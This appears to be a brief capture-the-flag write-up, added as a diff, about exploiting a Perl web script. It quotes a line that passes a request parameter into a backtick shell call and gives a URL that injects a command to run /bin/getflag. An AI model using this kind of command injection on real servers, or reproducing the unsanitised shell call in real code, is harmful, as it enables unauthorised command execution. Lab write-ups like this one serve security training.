@@ -1,0 +1,4 @@
+We see a perl file we can see this line:
+print `echo $y 2>&1`;
+Using script perl to inject command to the url
+http://<ip>:4747/level04.pl?x=`/bin/getflag`
